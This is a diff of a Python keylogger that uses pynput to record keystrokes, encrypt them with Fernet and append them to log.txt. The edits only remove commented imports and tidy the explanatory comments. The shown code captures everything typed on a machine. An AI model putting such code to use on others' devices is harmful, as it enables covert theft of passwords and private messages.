@@ -1,7 +1,3 @@
-# import pynput
-# from pynput.keyboard import Key, Listener
-# from cryptography.fernet import Fernet
-
 import os
 from pynput import keyboard
 from pynput.keyboard import Key, Listener
@@ -38,7 +34,7 @@ def where_press(key):
         keys = [] 
     
 def write_file(keys):
-    with open("log.txt", "a") as f: #we could use w, as it stands for write, after this we have to use "a" (only if we don't have a file created before) as it stands for append, so it will append the new keys to the file
+    with open("log.txt", "a") as f: #we could use w, as it stands for write, after this, we have to use "a" (only if we don't have a file created before) as it stands for append, so it will append the new keys to the file
         for key in keys:
             k = str(key).replace("'", "")
             if k.find("space") > 0:
@@ -47,7 +43,7 @@ def write_file(keys):
                 encrypted_data = cipher_suite.encrypt(k.encode())
             else:
                 continue
-            f.write(encrypted_data.decode() + "\n") #adding the \n means after after each key press, it will go to a new line; so text will be printed vertically
+            f.write(encrypted_data.decode() + "\n") #adding the \n means that after each key press, it will go to a new line; so text will be printed vertically
 
 def where_release(key): 
     if key == Key.esc: #esc stands for escape!
